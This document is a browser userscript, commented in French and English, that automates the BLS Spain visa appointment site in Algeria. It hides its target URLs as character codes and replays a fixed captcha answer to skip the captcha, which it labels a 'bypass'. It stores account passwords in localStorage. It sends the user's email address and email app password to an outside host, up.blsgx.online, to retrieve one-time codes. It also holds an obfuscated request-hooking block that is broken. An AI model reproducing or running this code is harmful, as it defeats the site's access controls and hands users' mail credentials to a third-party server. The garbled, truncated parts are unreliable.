/*(function() {
    'use strict';

    setInterval(function(){
        location.reload();
    }, 1500);
})();*/

(function() {
    'use strict';

    const errorsToCheck = ["504 Gateway Time-out", "502 Bad Gateway", "403 Forbidden", "500 Internal Server Error", "Application Temporarily Unavailable", "Too Many Requests"];

    setInterval(() => {
        if (errorsToCheck.some(error => document.body.innerText.includes(error))) {
            if (document.body.innerText.includes("403 Forbidden")) {
                document.body.innerHTML = "<div style='font-size: 30px;'>RS2K__ Accès Interdit ! Impossible de se connecter. Redémarrez votre modem ou utilisez un proxy pour changer votre IP et ouvrir la voie à de nouvelles possibilités.</div>";
                setTimeout(() => {
                    location.reload();
                }, 5000); // Actualisation toutes les 5 secondes
            } else {
                document.body.innerText = "RS2K __Reload in 1sec";
                setTimeout(() => {
                    location.reload();
                }, 1000); // Actualisation toutes les 1 seconde pour les autres erreurs
            }
        }
    }, 1000); // Vérification toutes les 1 seconde
})();
(function() {
    'use strict';

    // Créer le bouton
    var visitButton = document.createElement('button');
    visitButton.textContent = 'Visite Rs2k Site';
    visitButton.style.background = 'none';
    visitButton.style.border = 'none';
    visitButton.style.textDecoration = 'underline';
    visitButton.style.color = 'White';  // Couleur grise
    visitButton.style.cursor = 'pointer';
    visitButton.style.marginLeft = '-5px'; // Ajustez cette valeur selon votre besoin


    // Trouver l'élément parent du logo
    var logoParent = document.querySelector('.col-lg-3');
    if (logoParent) {
        // Insérer le bouton après le logo
        logoParent.appendChild(visitButton);
    } else {
        console.error('Impossible de trouver l\'élément parent du logo.');
    }

    // Ajouter un écouteur d'événement pour le clic sur le bouton
    visitButton.addEventListener('click', function() {
        // Rediriger vers le site Rs2k
        window.open('https://rs2kfastteam.xyz/rs2k.html', '_blank');
    });
})();

// Fonction pour enregistrer l'état des toggle switches dans le stockage local
function saveToggleSwitchState() {
    localStorage.setItem('simpleScriptEnabled', simpleScriptEnabled);
    localStorage.setItem('individualEnabled', individualEnabled);
}

// Variable pour suivre l'état du toggle switch SIMPLE SCRIPT
let simpleScriptEnabled = localStorage.getItem('simpleScriptEnabled') === 'true';

// Variable pour suivre l'état du toggle switch INDIVIDUAL
let individualEnabled = localStorage.getItem('individualEnabled') === 'true';

// Fonction pour exécuter le script SIMPLE SCRIPT ////////////////////////////////////////////////////////////////////////////////////////SIMPLESCRIPT
function executeSimpleScript() {
    if (simpleScriptEnabled) {

function reloadPageIfError() {
    const errorTitles = [
        "504 Gateway Time-out",
        "502 Bad Gateway",
        "403 Forbidden",
        "500 Internal Server Error",
        "Application Temporarily Unavailable",
    ];

    const pageTitle = document.title;

    if (errorTitles.includes(pageTitle)) {
        setTimeout(function () {
            window.location.reload();
        }, 1000);
    }
}



(function() {
    'use strict';

    function clickElement(element) {
        var event = document.createEvent('MouseEvents');
        event.initEvent('click', true, true);
        element.dispatchEvent(event);
    }


    // Function to combine all clicks
    function clickAllElements() {
        // Find and click the image
        var imgElement = document.querySelector('img.avatar-img[src="/assets/images/avatar/01.jpg"]');
        if (imgElement) {
            clickElement(imgElement);
        }

        // Find and click the anchor
        var anchorElement = document.querySelector('a.dropdown-item.bg-danger-soft-hover[href="javascript:OnLogout();"]');
        if (anchorElement) {
            clickElement(anchorElement);
        }

        // Find and click the button
        var buttonElement = document.querySelector('button.btn.btn-danger[onclick="OnLogoutSubmit();"]');
        if (buttonElement) {
            clickElement(buttonElement);
        }
    }

    // Create a styled button next to the specified image with the same dimensions
    function createButton() {
        var imgElement = document.querySelector('img.avatar-img[src="/assets/images/avatar/01.jpg"]');
        if (!imgElement) {
            console.error('Image element not found.');
            return;
        }


        var button = document.createElement('button');
button.className = 'btn btn-danger';
button.style.position = 'absolute';
button.style.top = (imgElement.offsetTop + 45) + 'px'; // Décalage de 10 pixels vers le bas
button.style.left = (imgElement.offsetLeft + imgElement.offsetWidth + 0.001) + 'px'; // Ajouter 10px pour l'espacement
button.style.width = imgElement.offsetWidth + 'px';
button.style.height = imgElement.offsetHeight + 'px';
button.style.zIndex = '9999';

        // Add a different logout icon to the button
        var logoutIcon = document.createElement('i');
        logoutIcon.className = 'fa fa-sign-out-alt me-2'; // Use a different logout icon class, e.g., 'fa-sign-out-alt'
        button.appendChild(logoutIcon);

        // Add click event to the button
        button.addEventListener('click', clickAllElements);

        // Append the button to the body
        document.body.appendChild(button);
    }

    // Create the button when the script is executed
    createButton();



var x = window['location']['href'];
if (
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47, 68, 90, 65, 47, 65, 99, 99, 111, 117, 110, 116, 47, 76, 111, 103, 73, 110)) ||
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47, 68, 90, 65, 47, 97, 99, 99, 111, 117, 110, 116, 47, 108, 111, 103, 105, 110)) ||
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47)) ||
    x['includes'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47, 42, 47, 98, 108, 115, 65, 112, 112, 111, 105, 110, 116, 109, 101, 110, 116, 47, 77, 97, 110, 97, 103, 101, 65, 112, 112, 111, 105, 110, 116, 109, 101, 110, 116)) ||
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 98, 108, 115, 115, 112, 97, 105, 110, 109, 111, 114, 111, 99, 99, 111, 46, 110, 101, 116, 47))
) {


  (function() {
        'use strict';

        var axiosScript = document.createElement('script');
        axiosScript.src = 'https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js';
        document.head.appendChild(axiosScript);

        axiosScript.onload = function() {
            const axiosConfig = {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Referer": "https://algeria.blsspainglobal.com/DZA/CaptchaPublic/GenerateCaptcha?data=CXE0KwrmeprPjank82nvACV3quvIzljHrJbO7HIMobQDczQYlcdmU2mcTsblZxqU7NNbr%2bVOwgkPtw1NjUhif84edDhWhjzySPzP2H8ALJ0%3d",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.225 Safari/537.36",
                },
            };
        let captchaId = document.getElementById("CaptchaId").value;

        axios.post(
            'https://algeria.blsspainglobal.com/DZA/CaptchaPublic/SubmitCaptcha',
            {
                SelectedImages: 'ltles,uqjidmnth,rldvc',
                Id: captchaId,
                Captcha: "Bf0KU6r4PHzEtR9My6uzzPdKSddwylXruf9ExVC2AqwgiR5ycEqqKD0n6sTVxpXFAMEiyxKbKypeIJeRKluBctR3LnnxxPJy2rnOI+vCTXd/dFEObgxYW8YwyGW58oGBY3+nQ87uJvgs3HZgc+ZOft1fFK82dImahOv4G4ZaWzOqa/P/5MCDtejXzT9Oz0ZR7ADLJ6J+MzD2LrB8OZpKBsr5JdNjSEfcIQHHX2aY/c4Ax+Xw+FLWvYTC4N6oeceaAWvVATxJpBxADKkI79Ltu0o1Mw6cF2lgS8IwQsXuzLTQYCnRbl7D1dh8O556BQackiPdUnRtfWHbsnpXSESSH/JfofZ/kIZak4qxQ6+Bthlxsg6H2hVJx+44GdBwkoDN4V7E47kPAlSRiZtJUzoyozyG8rvqKeXwbucRyLBywkte2srjfD0rRpWdJ4LBpkI6P10GBCuRQC2c13GL2RQH8PPrfdIVs6MuEDLhktzfUO1LWg0E4lMtEpC44hcydqhL680ho2HFM2DDrf7x41PZE07Z4ZcnQrnrkC3HG98ukQY73KHKJnrCR8698RN0nVE43Cdenplq1BHAO0uKDbFaxXlAfR3pmDRoFYOoZeNZ9ZUD18UtRl+G62Ng2DE/mN0N+MNUOEYM1G96SvqDFx644Ud4cp6ecvF1FkCg0tMszDjP5vUwnkd8cNgYlnOGFWOpz4pW9kaGe05khy3YtBTD48J4+CxTpPAauoQvcr7zfumEYYNDFWKxh6SD0NHAiBu/EQW2Xq5tgSDVD8P4NKvIE4dcge2JUpckYCe1CfLsZbQBGbaxVr9vEFvZ0XXWIivBxJGPwwmJQ8et1pZ8YxQoDY2VJO3RRX+PS3Uotr3EnQ4EVf83V7mSlZ7TrBvL5nMlPaGk0TKajUUI4n75VtZR1C8lgsxvTlM+klZ1Vh3JYYVdIgru823JN/lI2LbvPieTZu5xJGkF23o5mrXJW/Chk8chm5llGr82qSjdylBm8+z6dJ2a9poNYvl044u6WYFtqHECgTiHkqFnWEzOIK7XgpgX6HFMfhgFyQZImyeQd+tRZNiH8bYoXz29DBKKkkaLQH0DN2TnJakDqvDkpZLsGeFk3A1ZpaX4geR4lyx2S5jkQnQBUS6b9xqPqC0tMEUXWwyFKh3Zyyixpzc4T0pibJz01WwwW0MROCTWy+/x21L4RoZQgUn/0kZf2nlQo+5gzHk2mkIJguWprFDSxTCWDoFrteMtoeKZ1Z4NvaBfYfwJDtqmana+olPBrfMIiyPFoVdBe4kAJegfb0/dC+1uWEln/k604YF/P3yoHfP4BcN6C5Mn2urxZc13DzWaOhAoX9beX+gpkCMPXeeII5f+YfcDdZP2Dvrc42Rc7vSCvr7nb2yTopbTCoE7t4pT2uHh56QYy5+GgOnRJX5mzZRdkHK3zH6dVxohfpIFUJUQdKXqgLxlVSyCYboqrYwXpSGt/P5Vu/KFhTVxUqCGay9Gtf3W/taBraqopkj3Di2hPTfxw2KdW3UBwDBmt4YX57vTYNOvfuZPqooQQhDlxy5LuBSTON0ssrxo2ew4Oca+IfNVqC033cZUnQnxQSObrNN+ilO9A/OwYw57DVPmgfo/m2+USh27bZHX+CgoQdPPQ48/Gsz7MVjaTdBQ2sg7D/FJuVuKECylGo89bydEPTlGyyvrn1pPgI2j9Zm4r3/xxCVx3MH1D5SOeCpCdXKQwsyuOO6fOj55cUvmpvxekd8+F20X9WgKVElqkk0Gcw4sTSFlpfGT05j3LnY+G3nE7LGOP3huhV6417M+zcW2XUYU0k0zyh02R4Qdb/HL+xVoazoNyw4g9haiabpdQZN5hQTee+vVKLAsG3gRe9FLnSjoumkb0GKMjdRN1gfmpg10/oVTladgE93wYK1A4DatM9Y/6J26ka0i3Mw6oSqjJXswuBZzbbl7ZfSF46jPwpZj12RDrPDSMjydh7cx7x4ycY68",
                __RequestVerificationToken: document.getElementsByName("__RequestVerificationToken")[0].value,
            },
            axiosConfig
        ).then(res => {
            console.log(res.data);
            document.getElementById("CaptchaData").value = res.data['captcha'];
            document.getElementById("CaptchaId").value = res.data['captchaId'];

var btnVerify = document.getElementById("btnVerify");
if (btnVerify) {
    btnVerify.style.display = "block";
    btnVerify.innerText = "CAPTCHA VERIFIED // YOU CAN LOG'IN NOW";
    btnVerify.className = "btn btn-success text-center";
    btnVerify.setAttribute("disabled", "");
    // You can customize other style properties or attributes if needed
}


            // Afficher le bouton btnSubmit
            var btnSubmit = document.getElementById("btnSubmit");
            if (btnSubmit) {
                btnSubmit.style.display = "block";
                btnSubmit.innerText = "BAYPASS ACTIVATED";
            }
        });
    };
})();

 function tramelle() {
        if ($('#btnSubmit').attr('style') === '') {
            $('#btnSubmit').click();
            $('#btnSubmit').prop('disabled', true);
        }
    }
if (location.href.match(/ChangePassword|changepassword|CHANGEPASSWORD/)) {
        window.location.replace('https://algeria.blsspainglobal.com/DZA/bls/vtv0050');
    }

    if(window.location.href == ("https://algeria.blsspainglobal.com/DZA/blsappointment/manageapplicant?alert=true")){
      // window.location.replace("https://algeria.blsspainglobal.com/DZA/bls/visatypeverification");
    }
   if (window.location.href.includes("https://algeria.blsspainglobal.com/DZA/bls/vtv0050")) {
    $("button[id=btnVerify]").click();
    setInterval(function() { tramelle(); }, 1000);
}

       if(location.href.match(/Home|home|HOME/)){
          if ($(".avatar-img").length){
                window.location.replace("https://algeria.blsspainglobal.com/DZA/bls/vtv0050");
          }else{
                window.location.replace("https://algeria.blsspainglobal.com/DZA/account/login");
          }
       }

         var VariabLe = $(".bg-mode form div:visible .form-label:contains('Visa Type')").attr("id");
       var VariabLe_2 = $(".bg-mode form div:visible .form-label:contains('Visa Sub Type')").attr("id");
       var VariabLe_3 = $(".bg-mode form div:visible .form-label:contains('Appointment Category')").attr("id");

     if(location.href.match(/data/)){

         for (var i = 1; i < 6; i++) {

          if(VariabLe == "VisaType"+i+"_label"){
            $("#VisaType"+i+"_listbox > li:eq(1)").click();
        }
        if(VariabLe_2 == "VisaSubType"+i+"_label"){
            $("#VisaSubType"+i+"_listbox > li:eq(0)").click();
        }
        if(VariabLe_3 == "AppointmentCategoryId"+i+"_label"){
            $("#AppointmentCategoryId"+i+"_listbox > li:eq(1)").click();
        }

      /*  if(VariabLe_4 == "Location"+i+"_label"){
            $("#Location"+i+"_listbox > li:eq(0)").click();
        }*/
 }

    var choixUtilisateur = prompt(" SELECT : 1 // ALGER / 0 // ORAN ");
var variabLe_4 = $(".bg-mode form div:visible .form-label:contains('Location')").attr("id");

if (choixUtilisateur === "0" || choixUtilisateur === "1") {
    for (var i = 1; i < 6; i++) {
        if (variabLe_4 == "Location" + i + "_label") {
            // Sélectionne l'élément correspondant en fonction du choix de l'utilisateur
            var indexToClick = parseInt(choixUtilisateur);

            // Clique sur l'élément de la liste déroulante correspondant au choix de l'utilisateur
            $("#Location" + i + "_listbox > li:eq(" + indexToClick + ")").click();


            break;
        }
    }
} else {
}

(function() {
    'use strict';

    window.addEventListener('load', function() {
        setTimeout(function() {
            var okButton = document.querySelector('button.btn.btn-primary[data-bs-dismiss="modal"]');
            if (okButton) {
                okButton.click();
            } else {
                console.log('Le bouton "Ok" n\'a pas été trouvé.');
            }
        }, 1000);
    });
})();


}

if(location.href.match(/ManageAppointment/)){





 }

  if(location.href.match(/livenessdetection/)){

    //  $('script[src="/assets/vendor/bioid/js/startVideo().js?v=cYV2_QtkS9WSeWhabBLqSPxCFEFAVxkA7oHJZH3HYKQ"]').remove();
    //  $('script').remove()

 }


 $(window).scrollTop( 180 );


(function() {
    'use strict';

    // Create and append the container for the login page
    const loginContainer = document.createElement('div');
    loginContainer.className = 'login-container';
    document.body.appendChild(loginContainer);

    // Inject custom styles
    const style = document.createElement('style');
    style.innerHTML = `
        .modal-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            justify-content: flex-start;
            align-items: center;
            background: rgba(0, 0, 0, 0.5);
            z-index: 100000000;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200vh;
        }

        .login-form {
            display: table;
            padding: 30px;
            color: #fff;
            background: #0f0d0d;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 400px;
            max-width: 80%;
            height: 300px; /* Hauteur ajustée */
        }

        .login-form h1 {
            margin: 0 0 24px 0;
        }

        .login-form .form-input-material {
            margin-bottom: 12px;
        }

        .login-form .btn {
            width: 90%;
            margin-bottom: 10px;
        }

        .btn-danger {
            background-color: #962020;
            color: #fff;
        }

        .form-row {
            display: table-row;
        }

        .form-cell {
            display: table-cell;
            padding: 8px;
        }

        .form-label {
            font-weight: bold;
            padding-right: 10px;
        }

        .form-input {
            padding: 6px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
    `;
    document.head.appendChild(style);
// Function to simulate a click event on an element
    function clickElement(element) {
        var event = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window
        });
        element.dispatchEvent(event);
    }
    // Create and append the button to the header
    const button = document.createElement('button');
    button.className = 'btn btn-primary btn-ghost';
    button.innerText = 'SHOW LOGIN FORM';
    document.body.insertBefore(button, document.body.firstChild);


    // Create and append the "Supprimer" button
    const deleteButton = document.createElement('button');
    deleteButton.className = 'btn btn-danger btn-ghost';
    deleteButton.innerText = 'DELETE';
    document.body.insertBefore(deleteButton, button.nextSibling);

    // Create and append the modal container with the form inside the login container
    const modalContainer = document.createElement('div');
    modalContainer.className = 'modal-container';
    modalContainer.innerHTML = `
     <div class="login-form">
        <h1>ADD APPLICANT</h1>
        <div class="form-group">
            <label for="fullName">Nom Prénom</label>
            <input type="text" name="fullName" id="fullName" placeholder=" " autocomplete="off" class="form-control" required />
        </div>

        <div class="form-group">
            <label for="email">Adresse email "BLS ACCOUNT"</label>
            <input type="email" name="email" id="email" placeholder=" " autocomplete="off" class="form-control" required />
        </div>
        <div class="form-group">
            <label for="password">Mot de passe "BLS ACCOUNT"</label>
            <input type="password" name="password" id="password" placeholder=" " autocomplete="off" class="form-control" required />
        </div>
        <div class="form-group">
          <label for="__RS_otpPassword" class="form-label">Application OTP Password: <span class="emoji" title="Pour récupérer le mot de passe d'application de votre e-mail, accédez aux paramètres de sécurité de votre compte e-mail et générez un nouveau mot de passe d'application. Ce mot de passe sera utilisé ici.">ℹ️</span></label>
            <input type="text" class="form-control" id="__RS_otpPassword">
        </div>
        <button type="submit" class="btn btn-primary btn-ghost" id="saveButton">Enregistrer</button>
        <button class="btn btn-primary btn-ghost" id="closeButton">Fermer</button>
    </div>

    `;
    loginContainer.appendChild(modalContainer);

    // Add event listener to the button
    button.addEventListener('click', function() {
        modalContainer.style.display = 'flex';
    });

    // Add event listener to the "Supprimer" button
    deleteButton.addEventListener('click', function() {
        const profiles = document.querySelectorAll('.delete-profile');
        profiles.forEach(profile => {
            profile.style.textDecoration = '';
            profile.style.color = 'white';
            profile.addEventListener('click', function() {
                const profileIndex = Array.from(profiles).indexOf(profile);
                const savedButtons = JSON.parse(localStorage.getItem('buttons')) || [];
                const updatedButtons = savedButtons.filter((_, index) => index !== profileIndex);
                localStorage.setItem('buttons', JSON.stringify(updatedButtons));
                updateProfileButtons();
            });
        });
    });

    // Add event listener to the save button
    const saveButton = document.getElementById('saveButton');
    if (saveButton) {
        saveButton.addEventListener('click', function() {
            const fullName = document.getElementById('fullName').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const __RS_otpPassword = document.getElementById('__RS_otpPassword').value;

            const buttons = JSON.parse(localStorage.getItem('buttons')) || [];
            buttons.push({ fullName, buttonText: `LOG: ${fullName}`, email, password });
            localStorage.setItem('buttons', JSON.stringify(buttons));
            updateProfileButtons();

            modalContainer.style.display = 'none';
        });
    }

    // Add event listener to the close button
    const closeButton = document.getElementById('closeButton');
    if (closeButton) {
        closeButton.addEventListener('click', function() {
            modalContainer.style.display = 'none';
        });
    }

    // Add event listener to the form to hide it when submitted
    const form = document.querySelector('.login-form');
    if (form) {
        form.addEventListener('submit', function(event) {
            event.preventDefault();
            alert('Custom form submission logic');
            modalContainer.style.display = 'none';
        });
    }

    // Restore saved buttons on page load
    function updateProfileButtons() {
        const savedButtons = JSON.parse(localStorage.getItem('buttons')) || [];
        const existingButtons = document.querySelectorAll('.delete-profile');
        existingButtons.forEach(button => button.remove());

        for (const savedButton of savedButtons) {
            const restoredButton = document.createElement('button');
            restoredButton.className = 'btn btn-primary btn-ghost delete-profile';
            restoredButton.innerText = savedButton.buttonText;
            document.body.insertBefore(restoredButton, button.nextSibling);

            restoredButton.addEventListener('click', function() {
                document.getElementById('UserId1').value = savedButton.email;
                document.getElementById('UserId2').value = savedButton.email;
                document.getElementById('UserId3').value = savedButton.email;
                document.getElementById('UserId4').value = savedButton.email;
                document.getElementById('UserId5').value = savedButton.email;
                document.getElementById('UserId6').value = savedButton.email;
                document.getElementById('UserId7').value = savedButton.email;
                document.getElementById('UserId8').value = savedButton.email;
                document.getElementById('UserId9').value = savedButton.email;
                document.getElementById('UserId10').value = savedButton.email;
                document.getElementById('Password1').value = savedButton.password;
                document.getElementById('Password2').value = savedButton.password;
                document.getElementById('Password3').value = savedButton.password;
                document.getElementById('Password4').value = savedButton.password;
                document.getElementById('Password5').value = savedButton.password;
                document.getElementById('Password6').value = savedButton.password;
                document.getElementById('Password7').value = savedButton.password;
                document.getElementById('Password8').value = savedButton.password;
                document.getElementById('Password9').value = savedButton.password;
                document.getElementById('Password10').value = savedButton.password;

                $('#btnSubmit').click();
                $('#btnSubmit').prop('disabled', true);
            });
        }
    }

    updateProfileButtons();
    (function () {
'use strict';
const expectedResponse = '';
var originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    if (url.includes('/DZA/account/loginPost')) {
        url = url.replace('/DZA/account/loginPost', '/dza/account/loginPost');
    }
    originalOpen.call(this, method, url, async, user, password);
};
function _0x2d4d(_0x8f0210, _0x11da09) {
    const _0x1c446c = _0x1c44();
    return _0x2d4d = function (_0x2d4db3, _0x56b6c2) {
        _0x2d4db3 = _0x2d4db3 - 0x148;
        let _0x3a54bf = _0x1c446c[_0x2d4db3];
        return _0x3a54bf;
    }, _0x2d4d(_0x8f0210, _0x11da09);
}(function (_0x3fa3d7, _0x58bce3) {
    const _0x346fda = _0x2d4d
        , _0x345031 = _0x3fa3d7();
    while (!![]) {
        try {
            const _0x103221 = -parseInt(_0x346fda(0x154)) / 0x1 +
                -parseInt(_0x346fda(0x152)) / 0x2 * (-parseInt(
                    _0x346fda(0x15b)) / 0x3) + parseInt(_0x346fda(
                    0x148)) / 0x4 + -parseInt(_0x346fda(0x158)) /
                0x5 * (parseInt(_0x346fda(0x14a)) / 0x6) +
                parseInt(_0x346fda(0x157)) / 0x7 * (-parseInt(
                    _0x346fda(0x150)) / 0x8) + parseInt(_0x346fda(
                    0x155)) / 0x9 + parseInt(_0x346fda(0x14c)) /
                0xa;
            if (_0x103221 === _0x58bce3) break;
            else _0x345031['push'](_0x345031['shift']());
        } catch (_0x485aa7) {
            _0x345031['push'](_0x345031['shift']());
        }
    }
}(_0x1c44, 0xaada4), (function () {
    'use strict';
    const _0x2a9ef9 = _0x2d4d;
    fetch [_0x2a9ef9(0x159)](
        _0x422d96 => _0x422d96[_0x2a9ef9(0x14d)]())[
        _0x2a9ef9(0x159)](_0x3be9f6 => {
        const _0xfcbb83 = _0x2a9ef9

        if (_0x3be9f6 === _0x33f880) {
            var _0xfffbf1 = XMLHttpRequest[
                'prototype'][_0xfcbb83(0x14b)];
            XMLHttpRequest['prototype']['open'] =
                function (_0x2214f5, _0x433cdc,
                    _0x87f202, _0x3dd671, _0x15168e) {
                    const _0x2e021c = _0xfcbb83;
                    _0x433cdc[_0x2e021c(0x14e)](
                            '/DZA/account/login') && (
                            _0x433cdc = _0x433cdc[
                                _0x2e021c(0x15d)](
                                _0x2e021c(0x153),
                                _0x2e021c(0x14f))),
                        _0xfffbf1['call'](this,
                            _0x2214f5, _0x433cdc,
                            _0x87f202, _0x3dd671,
                            _0x15168e);
            };
        } else console[_0xfcbb83(0x15a)](_0xfcbb83(
            0x156));
    })[_0x2a9ef9(0x15c)](_0x546720 => {
        const _0x50dbaa = _0x2a9ef9;
        console[_0x50dbaa(0x149)](_0x50dbaa(0x151),
            _0x546720);
          })();
        }()));
    })();

})();};})();

// Récupérer l'adresse email et le mot de passe du formulaire
    const Email = document.querySelector("#email").value;
    const OTPPassword = document.querySelector("#__RS_otpPassword").value;

    console.log("Email: " + Email);
    console.log("Application OTP Password: " + OTPPassword);

    const SendVerificationCodeButton = document.querySelector("#btnSenderificationCode");
    const Verify_Button = document.querySelector("#btnVerifyEmail");

    SendVerificationCodeButton.addEventListener("click", async function () {
        async function GetTheAppointment() {
            console.log("OTP Directly from Function");
            await sleep(1);
            var otp = await getOTPOnly();
            console.log(otp);
            console.log("email :" + Email + ", pass :" + OTPPassword);
            document.querySelector("#EmailVerificationCode").value = otp;
            setTimeout(() => {
                if (document.querySelector("#EmailVerificationCode").value == otp) {
                    Verify_Button.click();
                } else {
                    console.log("the otp code is wrong");
                }
            }, 500);
        }

        await GetTheAppointment();
    });

    setTimeout(() => {
        let SendVerificationCodeButton = document.querySelector("#btnSenderificationCode");

        if (SendVerificationCodeButton.textContent == "Resend Verification Code") {
            async function GetTheAppointment() {
                console.log("OTP Directly from Function");
                await sleep(1);
                var otp = await getOTPOnly();
                console.log(otp);
                console.log("email :" + Email + ", pass :" + OTPPassword);
                document.querySelector("#EmailVerificationCode").value = otp;
                setTimeout(() => {
                    if (document.querySelector("#EmailVerificationCode").value == otp) {
                        Verify_Button.click();
                    } else {
                        console.log("the otp code is wrong");
                    }
                }, 500);
            }

            GetTheAppointment();

        } else {
            console.log("the otp code is not sent yet ");
        }

    }, 1500);

    async function getOTPOnly() {
        console.log("getONLY")
        let otp = 0;
        var myHeaders = new Headers();
        myHeaders.append("Content-Type", "application/json");

        var raw = JSON.stringify({
            "email": Email,
            "__RS_otpPassword": OTPPassword,
        });

        var requestOptions = {
            method: 'POST',
            headers: myHeaders,
            body: raw,
            redirect: 'follow'
        };

        const res = await fetch("https://up.blsgx.online/email", requestOptions);

        return await res.json();
    }

    async function sleep(seconds) {
        return new Promise(res => setTimeout(res, seconds * 500));
    }

;
        console.log('SIMPLE SCRIPT est activé !');
    }
}

// Fonction pour exécuter le script INDIVIDUAL///////////////////////////////////////////////////////////////////////////////////// INDIVIDUAL
function executeIndividualScript() {
    if (individualEnabled) {

(function() {
    'use strict';

    function clickElement(element) {
        var event = document.createEvent('MouseEvents');
        event.initEvent('click', true, true);
        element.dispatchEvent(event);
    }


    // Function to combine all clicks
    function clickAllElements() {
        // Find and click the image
        var imgElement = document.querySelector('img.avatar-img[src="/assets/images/avatar/01.jpg"]');
        if (imgElement) {
            clickElement(imgElement);
        }

        // Find and click the anchor
        var anchorElement = document.querySelector('a.dropdown-item.bg-danger-soft-hover[href="javascript:OnLogout();"]');
        if (anchorElement) {
            clickElement(anchorElement);
        }

        // Find and click the button
        var buttonElement = document.querySelector('button.btn.btn-danger[onclick="OnLogoutSubmit();"]');
        if (buttonElement) {
            clickElement(buttonElement);
        }
    }

    // Create a styled button next to the specified image with the same dimensions
    function createButton() {
        var imgElement = document.querySelector('img.avatar-img[src="/assets/images/avatar/01.jpg"]');
        if (!imgElement) {
            console.error('Image element not found.');
            return;
        }


        var button = document.createElement('button');
button.className = 'btn btn-danger';
button.style.position = 'absolute';
button.style.top = (imgElement.offsetTop + 45) + 'px'; // Décalage de 10 pixels vers le bas
button.style.left = (imgElement.offsetLeft + imgElement.offsetWidth + 0.001) + 'px'; // Ajouter 10px pour l'espacement
button.style.width = imgElement.offsetWidth + 'px';
button.style.height = imgElement.offsetHeight + 'px';
button.style.zIndex = '9999';

        // Add a different logout icon to the button
        var logoutIcon = document.createElement('i');
        logoutIcon.className = 'fa fa-sign-out-alt me-2'; // Use a different logout icon class, e.g., 'fa-sign-out-alt'
        button.appendChild(logoutIcon);

        // Add click event to the button
        button.addEventListener('click', clickAllElements);

        // Append the button to the body
        document.body.appendChild(button);
    }

    // Create the button when the script is executed
    createButton();



var x = window['location']['href'];
if (
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47, 68, 90, 65, 47, 65, 99, 99, 111, 117, 110, 116, 47, 76, 111, 103, 73, 110)) ||
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47, 68, 90, 65, 47, 97, 99, 99, 111, 117, 110, 116, 47, 108, 111, 103, 105, 110)) ||
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47)) ||
    x['includes'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 97, 108, 103, 101, 114, 105, 97, 46, 98, 108, 115, 115, 112, 97, 105, 110, 103, 108, 111, 98, 97, 108, 46, 99, 111, 109, 47, 42, 47, 98, 108, 115, 65, 112, 112, 111, 105, 110, 116, 109, 101, 110, 116, 47, 77, 97, 110, 97, 103, 101, 65, 112, 112, 111, 105, 110, 116, 109, 101, 110, 116)) ||
    x['startsWith'](String['fromCharCode'](104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 98, 108, 115, 115, 112, 97, 105, 110, 109, 111, 114, 111, 99, 99, 111, 46, 110, 101, 116, 47))
) {


   (function() {
        'use strict';

        var axiosScript = document.createElement('script');
        axiosScript.src = 'https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js';
        document.head.appendChild(axiosScript);

        axiosScript.onload = function() {
            const axiosConfig = {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Referer": "https://algeria.blsspainglobal.com/DZA/CaptchaPublic/GenerateCaptcha?data=CXE0KwrmeprPjank82nvACV3quvIzljHrJbO7HIMobQDczQYlcdmU2mcTsblZxqU7NNbr%2bVOwgkPtw1NjUhif84edDhWhjzySPzP2H8ALJ0%3d",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.225 Safari/537.36",
                },
            };
        let captchaId = document.getElementById("CaptchaId").value;

        axios.post(
            'https://algeria.blsspainglobal.com/DZA/CaptchaPublic/SubmitCaptcha',
            {
                SelectedImages: 'ltles,uqjidmnth,rldvc',
